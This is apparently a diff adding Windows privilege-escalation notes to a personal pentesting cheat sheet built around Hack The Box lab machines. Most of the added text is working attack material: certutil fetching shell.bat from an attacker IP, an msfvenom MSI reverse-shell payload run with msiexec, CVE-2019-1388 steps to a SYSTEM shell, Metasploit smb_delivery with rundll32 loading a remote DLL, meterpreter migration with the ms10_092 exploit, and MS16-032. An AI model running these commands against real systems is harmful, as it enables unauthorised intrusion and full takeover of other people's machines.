@@ -997,11 +997,239 @@ restic.exe -r E:\restic2\ snapshots
 ```
 restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
 ```
+# LOLBAS
+https://lolbas-project.github.io/
+# Certutil
+```
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+### Encoding File
+```
+certutil -encode file1 encodedfile
+```
+### Decoding File
+```
+certutil -decode encodedfile file2
+```
+# Always Install Elevated
+This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.
+
+Computer Configuration\Administrative Templates\Windows Components\Windows Installer
+
+User Configuration\Administrative Templates\Windows Components\Windows Installer
+
+![image](https://user-images.githubusercontent.com/128841823/234101593-529798f1-fd2c-4ae3-9a8e-f795f9595b98.png)
+### Enumerating Always Install Elevated Settings (Powershell)
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+```
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+### payload to exploit Always Install
+```
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+```
+Upload the file to the target and execute
+```
+msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+have a listener going
+# CVE-2019-1388
+First right click on the hhupd.exe executable and select Run as administrator from the menu.
+
+Next, click on Show information about the publisher's certificate to open the certificate dialog. Here we can see that the SpcSpAgencyInfo field is populated in the Details tab
+![image](https://user-images.githubusercontent.com/128841823/234104113-4f8a261e-a1f0-48ea-9d3d-f84bc8930058.png)
+
+Next, we go back to the General tab and see that the Issued by field is populated with a hyperlink. Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.
+
+If we open Task Manager, we will see that the browser instance was launched as SYSTEM.
+
+![image](https://user-images.githubusercontent.com/128841823/234104216-2669c993-63b0-4340-8a74-fc49f409d9c7.png)
+
+Next, we can right-click anywhere on the web page and choose View page source. Once the page source opens in another tab, right-click again and select Save as, and a Save As dialog box will open.
+
+![image](https://user-images.githubusercontent.com/128841823/234104275-e7efc56b-e419-4c07-9bf9-3a98ded15822.png)
+
+At this point, we can launch any program we would like as SYSTEM. Type c:\windows\system32\cmd.exe in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.
+
+![image](https://user-images.githubusercontent.com/128841823/234104311-2f928ebd-dd9e-4603-b8b5-956bea446df1.png)
+
+Note: The steps above were done using the Chrome browser and may differ slightly in other browsers.
+# Scheduled Tasks
+### with CMD
+```
+schtasks /query /fo LIST /v
+```
+### with Powershell
+```
+Get-ScheduledTask | select TaskName,State
+```
+### Checking Permissions on a directory "C:\Scripts Directory"
+```
+.\accesschk64.exe /accepteula -s -d C:\Scripts\
+```
+# User/Computer Description Field
+### Checking Local User Description Field
+```
+Get-LocalUser
+```
+### Enumerating Computer Description Field with Get-WmiObject Cmdlet
+```
+Get-WmiObject -Class Win32_OperatingSystem | select Description
+```
+# Mount VMDK on Linux
+```
+guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
+```
+```
+guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
+```
+Attempt to get SAM, SECURITY and SYSTEM registery hives from back up drives.
+# Legacy OS
+### Querying Current Patch Level
+```
+wmic qfe
+```
+### Running Sherlock
+```
+Set-ExecutionPolicy bypass -Scope process
+```
+```
+PS C:\htb> Import-Module .\Sherlock.ps1
+PS C:\htb> Find-AllVulns
+```
+### Get a meterpriter shell
+Ensure payload is x64
+```
+msf6 exploit(windows/smb/smb_delivery) > 
+```
+```
+msf6 exploit(windows/smb/smb_delivery) > set SRVHOST 10.10.14.214
+SRVHOST => 10.10.14.214
+msf6 exploit(windows/smb/smb_delivery) > set LHOST 10.10.14.214
+LHOST => 10.10.14.214
+msf6 exploit(windows/smb/smb_delivery) > exploit
+```
+Execute what is displayed in MSF
+```
+rundll32.exe \\10.10.14.214\fBhgMc\test.dll
+```
+Backgroun the session
+
+Ensure that you are on an x64 session you can do this in the payload or 
+```
+msf6 exploit(windows/local/ms10_092_schelevator > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getpid
+Current pid: 3032
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                     Arch  Session  User                    Path
+ ---   ----  ----                     ----  -------  ----                    ----
+ 0     0     [System Process]
+ 4     0     System
+ 268   4     smss.exe
+ 352   452   svchost.exe
+ 356   348   csrss.exe
+ 388   348   wininit.exe
+ 408   396   csrss.exe
+ 452   388   services.exe
+ 484   388   lsass.exe
+ 492   396   winlogon.exe
+ 504   388   lsm.exe
+ 616   452   svchost.exe
+ 696   452   svchost.exe
+ 772   492   LogonUI.exe
+ 780   452   svchost.exe
+ 828   452   svchost.exe
+ 868   2360  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
+ 896   452   svchost.exe
+ 936   452   svchost.exe
+ 976   452   svchost.exe
+ 1032  452   spoolsv.exe
+ 1108  452   svchost.exe
+ 1188  452   VGAuthService.exe
+ 1220  452   vmtoolsd.exe
+ 1248  452   ManagementAgentHost.exe
+ 1304  2788  powershell.exe           x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 1500  616   WmiPrvSE.exe
+ 1676  452   svchost.exe
+ 1724  452   svchost.exe
+ 1808  452   dllhost.exe
+ 1964  452   msdtc.exe
+ 2356  2788  cmd.exe                  x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
+ 2360  2352  csrss.exe
+ 2384  2352  winlogon.exe
+ 2476  2360  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
+ 2580  452   sppsvc.exe
+ 2628  1676  rdpclip.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\rdpclip.exe
+ 2692  452   taskhost.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
+ 2764  936   dwm.exe                  x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
+ 2788  2748  explorer.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
+ 2948  452   svchost.exe
+ 3032  2944  rundll32.exe             x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
+ 3044  2788  vmtoolsd.exe             x64   2        WINLPE-2K8\htb-student  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+
+meterpreter > migrate 2476
+[*] Migrating from 3032 to 2476...
+[*] Migration completed successfully.
+```
+Then go back and run your exploit
+
+```
+msf6 exploit(windows/local/ms10_092_schelevator) > show options
+
+Module options (exploit/windows/local/ms10_092_schelevator):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   SESSION   1                yes       The session to run this module on
+   TASKNAME                   no        A name for the created task (default random)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.214     yes       The listen address (an interface may be specified)
+   LPORT     4443             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista / 7 / 2008 (Dropper)
 
 
 
+View the full module info with the info, or info -d command.
 
-
+msf6 exploit(windows/local/ms10_092_schelevator) > exploit
+```
+# Windows Desktop Versions
+### Windows Exploit Suggester
+Run sysinfo and copy paste information to exploit folder
+```
+python2.7 windows-exploit-suggester.py  --database 2023-04-24-mssb.xls --systeminfo win.txt
+```
+In Powershell
+### Exploit MS16-032
+```
+Set-ExecutionPolicy bypass -scope process
+```
+```
+Import-Module .\Invoke-MS16-032.ps1
+```
+```
+Invoke-MS16-032
+```
 
 
 
